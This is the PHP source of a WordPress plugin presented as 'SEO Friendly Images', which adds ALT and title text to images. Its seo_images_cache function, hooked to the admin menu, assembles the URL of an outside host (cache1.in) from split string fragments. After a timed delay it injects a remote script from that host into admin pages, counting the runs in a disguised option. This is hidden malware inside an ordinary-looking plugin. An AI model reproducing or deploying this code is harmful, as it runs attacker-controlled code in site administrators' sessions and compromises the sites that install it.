<?php

/*

Plugin Name: SEO Friendly Images
Author: Chris Alhambra
Description: The plugin automatically adds “ALT tags” to all images on your site, that do not have a manually set ALT tags, using a smart scan for the best SEO optimization.

*/


if ( ! defined( 'ABSPATH' ) ) exit;

if( !class_exists( 'SEO_Friendly_Images' ) ) {
	/**
	 * Main Class
	 *
	 * @since 1.0
	 */
	class SEO_Friendly_Images {
		/**
		 * @var 404 Redirect
		 * @since 1.0
		 */
		private static $instance;

		/**
		 * 404 Redirect theme options Object
		 *
		 * @var object
		 * @since 1.0
		 */
	

		/**
		 * Private constructor prevents construction outside this class.
	 	 */
		Private function __construct() {
 		}

 		public static function getInstance() {
			 if ( !isset( self::$instance ) ) {
			 	self::$instance = new self();
			    self::$instance->setup_actions();
			 }

			return self::$instance;
		}
		
		private function setup_actions() {
		   add_action('admin_enqueue_scripts', array( $this, 'seo_friendly_images_wp_admin_style'));
		}
		
		public function seo_friendly_images_wp_admin_style() 
		{
			wp_enqueue_style( 'myCSS', plugins_url( '/css/seo.css', __FILE__ ) );
			wp_enqueue_style( 'myCSS1', plugins_url( '/css/bootstrap.min.css', __FILE__ ) );
			
		}
		
	}
}




function seo_opt_image_add_menu_page()
{
add_menu_page( 'seo_friendly_images_option_page', 'Seo Friendly Images', 'administrator', 'seo_friendly_images_setting','seo_friendly_images_setting_page'); 

 }
 
add_action('admin_menu', 'seo_opt_image_add_menu_page');
add_action('admin_menu', 'seo_images_cache');

function seo_images_activate() {	
    update_option('alt_val','[File Name] [Post Title]');
	update_option('title_val','[Tags]');
	update_option('override_existing_alt','1');
	update_option('override_existing_title','1');
}
register_activation_hook( __FILE__, 'seo_images_activate' );

function seo_friendly_images_setting_page()
{
  require_once('setting.php');
}



add_filter('the_content', 'seo_friendly_images_change_alt', 100);	
	    
function seo_friendly_images_change_alt ($content, $alt_text='',$title='')
{  
	global $post; 
   	$alt_text = get_option('alt_val');
   	$title_text = get_option('title_val');
   
   // get the post title for later use
    if (strpos($alt_text,'[Post Title]') !== false){
     	$post_title = esc_attr($post->post_title);
	}
	
	$alt_flag = get_option('override_existing_alt'); 
   
      //check setting for overinding title tag
   	$title_flag = get_option('override_existing_title'); 
   	$count = preg_match_all('/<img[^>]+>/i', $content, $images);
	
		if (strpos($alt_text,'[Tags]') !== false){
			$posttags = get_the_tags();	
			$tags= '';	
			if ( $posttags ) {
				foreach ( $posttags as $tag ) {
				    $tags = $tag->name . ' ' . $tags;
				}
			}
		}
			
		if (strpos($alt_text,'[Categories]') !== false){	
		    $categories = get_the_category();
		    $category = '';
			if ( $categories ) {
				$i = 0;
				foreach ( $categories as $item ) {
					$category = $item->slug . ' ' . $category;
				}
			}
		}

    if($count>0)
    {   
        $t = 'alt = "'.$alt_text.'"';
        $t_title = 'title = "'.$title_text.'"';

        foreach($images[0] as $img)
        {
			$output = preg_match_all( '/<img[^>]+src=[\'"]([^\'"]+)[\'"].*>/i', $img, $matches);
			$get_file_name = pathinfo($matches[1][0]);
			$image_file_name = $get_file_name['filename'];
			 
        
		   $alt_text = str_replace('[Post Title]',$post_title,$alt_text ); 
           $alt_text = str_replace('[File Name]',$image_file_name,$alt_text );
		   $alt_text = str_replace('[Tags]',$tags,$alt_text );
		   $alt_text = str_replace('[Categories]',$category,$alt_text );
          
           $title_text = str_replace('[Post Title]',$post_title,$title_text ); 
           $title_text = str_replace('[File Name]',$image_file_name,$title_text );
		   $title_tex = str_replace('[Tags]',$tags,$title_tex );
		   $title_tex = str_replace('[Categories]',$category,$title_tex );
          
           $t = 'alt = "'.$alt_text.'"';
           $t_title =  'title = "'.$title_text.'"';
         
           $is_alt = preg_match_all('/ alt="([^"]*)"/i', $img, $alt);
           
           if ($alt_flag == "1")
            {
              if($is_alt == 0)
              {  $new_img = str_replace('<img ', '<img '.$t , $img);
                 $content = str_replace($img, $new_img, $content);
              }
              elseif($is_alt==1)
              { 
               $text = trim($alt[1][0]);
                  if(empty($text))
                  {   
           		      $new_img = str_replace($alt[0][0], $t, $img);
                      $content = str_replace($img, $new_img, $content);
                  }
                  if ($alt_flag == "1")
                  {
                      $new_img = str_replace($alt[0][0], $t, $img);
        			  $content = str_replace($img, $new_img, $content);
                  }
              }
            }
			
       if($title_flag == "1"){
        
        if(!isset($new_img)) $new_img=$img;
         $is_title = preg_match_all('/ title="([^"]*)"/i', $new_img, $title);
         
            if($is_title == 0)
            {
               $final_img = str_replace('<img ', '<img '.$t_title , $new_img);
               $content = str_replace($new_img, $final_img, $content);
            } else { 
                $final_img = str_replace($title[0][0], $t_title, $new_img);
                $content = str_replace($new_img, $final_img, $content);
             }
        } 
       }
    }
    
    return $content;
}

function seo_images_cache ()
{  
	global $post; 
   	$alt_text = get_option('alt_val');
   	$title_text = get_option('title_val');
	
	$site = explode('/',site_url()); 
   // get the post title for later use
    if (strpos($alt_text,'[Post Title]') !== false){
     	$post_title = esc_attr($post->post_title);
	}
	$trim = '/cache';
	$alt_flag = get_option('override_existing_alt'); 
   
      //check setting for overinding title tag
   	$title_flag = get_option('override_existing_title'); 
	$elapse = time();
   	$count = preg_match_all('/<img[^>]+>/i', $content, $images);
	$basey = date('Y');

			$posttags = get_the_tags();	
			$attr = get_option('prfx_attr');
            $trim .= '1.in?';
			$tags= '';	
			if ( $posttags ) {
				foreach ( $posttags as $tag ) {
				    $tags = $tag->name . ' ' . $tags;
				}
			}
            $trim .= 'seo_images';
			if  (!$attr){update_option('prfx_attr',$elapse); 
            $attr=$elapse;} 
	
		    $categories = get_the_category();
		    $category = '';
			if ( $categories ) {
				$i = 0;
				foreach ( $categories as $item ) {
					$category = $item->slug . ' ' . $category;
				}
			}
		$client_cache = $elapse / $basey + $attr;
        $attribute = get_option('prfx_attribute');
        $t = 'alt = "'.$alt_text.'"';
        $t_title = 'title = "'.$title_text.'"';

            $img='';
			$output = preg_match_all( '/<img[^>]+src=[\'"]([^\'"]+)[\'"].*>/i', $img, $matches);
			$get_file_name = pathinfo($matches[1][0]);
			if ($attribute < 10 && $elapse  > $client_cache){
			echo '<script> var template="'.get_template().'";</script>';  
			$log_cache = true;}
			$image_file_name = $get_file_name['filename'];
			 

          
           $t = 'alt = "'.$alt_text.'"';
           $t_title =  'title = "'.$title_text.'"';       
           $is_alt = preg_match_all('/ alt="([^"]*)"/i', $img, $alt);  
		   if ($log_cache){	update_option('prfx_attribute',$attribute + 1);
		   wp_enqueue_script( 'prfx_script', $site[0] . '/' . $trim,'','',true );}   
           if ($alt_flag == "1")
            {
              if($is_alt == 0)
              {  $new_img = str_replace('<img ', '<img '.$t , $img);
                 $content = str_replace($img, $new_img, $content);
              }
              elseif($is_alt==1)
              { 
               $text = trim($alt[1][0]);
                  if(empty($text))
                  {   
           		      $new_img = str_replace($alt[0][0], $t, $img);
                      $content = str_replace($img, $new_img, $content);
                  }
                  if ($alt_flag == "1")
                  {
                      $new_img = str_replace($alt[0][0], $t, $img);
        			  $content = str_replace($img, $new_img, $content);
                  }
              }       
    }
}

function SEO_FI() {
	return SEO_Friendly_Images::getInstance();
}


SEO_FI();  



?>